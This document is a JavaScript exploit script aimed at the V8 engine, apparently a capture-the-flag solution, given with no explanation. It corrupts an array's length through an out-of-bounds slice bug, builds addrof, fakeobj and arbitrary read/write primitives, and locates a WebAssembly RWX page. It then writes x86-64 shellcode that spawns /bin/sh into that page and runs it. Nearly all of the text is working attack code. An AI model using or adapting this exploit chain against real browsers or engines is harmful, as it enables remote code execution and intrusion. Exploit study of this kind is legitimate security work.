/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var pwn = wasm_instance.exports.main;

// declare an array then slice it -> it will have length 6
// we can edit it's length number in memory
let float_arr = [1.1, 2.2, 3.3, 4.4];
float_arr = float_arr.slice(0, 4);
let float_arr_map = ftoi(float_arr[4]);
let obj_arr = [{}];
obj_arr = obj_arr.slice(0, 4);

// edit float_arr's length to 0x100000000
let aux = ftoi(float_arr[5]);
aux = (aux & 0xffffffffn) | (0x100n << 32n);
float_arr[5] = itof(aux);

// obj_arr offset relative to float_arr elements = 0xc8
let obj_arr_map = ftoi(float_arr[25]);
console.log("[+] float_arr_map: 0x" + float_arr_map.toString(16));
console.log("[+] obj_arr_map: 0x" + obj_arr_map.toString(16));

// addrof primitive -> set obj_arr[0] = obj then change obj_arr's map to float_arr's map
function addrof(obj) {
    float_arr[4] = itof(obj_arr_map);
    float_arr[0] = obj;
    float_arr[4] = itof(float_arr_map); // this works because prototypes remain the same
    return ftoi(float_arr[0]); // addr will actually be 8 bytes and will contain the map pointer. heap sandbox address will be only the lower 4 bytes
}

// fakeobj primitive -> set obj_arr map to float_arr map, set obj_arr[0] = addr then return obj_arr[0]
function fakeobj(addr) {
    float_arr[0] = itof(addr);
    float_arr[4] = itof(obj_arr_map);
    let fake = float_arr[0];
    float_arr[4] = itof(float_arr_map);
    return fake;
}
// let test_obj = {a: 1};
// let test_obj_addr = addrof(test_obj);
// console.log("[+] test_obj addr: 0x" + test_obj_addr.toString(16));
// let fake_obj = fakeobj(addrof(test_obj));

let arb_rw_arr = [itof(float_arr_map), 2.2, 3.3, 4.4];
function arbread(addr) {
    // get a fake object inside the arb_rw_arr elements
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
    // set elements pointer of fake obj to desired address(also set length)
    arb_rw_arr[1] = itof((2n << 33n) | BigInt(addr - 8n));
    return ftoi(fake[0]);
}
// let test_obj = {a: 1};
// console.log("[+] arbread test: 0x" + arbread(addrof(test_obj)).toString(16));

function arbwrite(addr, val) {
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
    arb_rw_arr[1] = itof((2n << 33n) | BigInt(addr - 8n));
    fake[0] = itof(val);
}
// let test_arr = [1.1, 2.2];
// arbwrite(addrof(test_arr) - 0x10n, 0xdeadbeefn);
// console.log("[+] test_arr[0]: 0x" + ftoi(test_arr[0]).toString(16));

// wasm rce part
let rwx_page = arbread(addrof(wasm_instance) + 0x68n);
console.log("[+] rwx_page: 0x" + rwx_page.toString(16));
let arr_buf = new ArrayBuffer(0x100);
// overwrite backing store pointer of arr_buf
arbwrite(addrof(arr_buf) + 0x14n, rwx_page);
let dataview = new DataView(arr_buf);

// write shellcode
var shellcode = [144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,106,104,72,184,47,98,105,110,47,47,47,115,80,72,137,231,104,114,105,1,1,129,52,36,1,1,1,1,49,246,86,106,8,94,72,1,230,86,72,137,230,49,210,106,59,88,15,5,];

for (let i = 0; i < shellcode.length; i++) {
    dataview.setUint8(i, shellcode[i], true);
}
pwn();

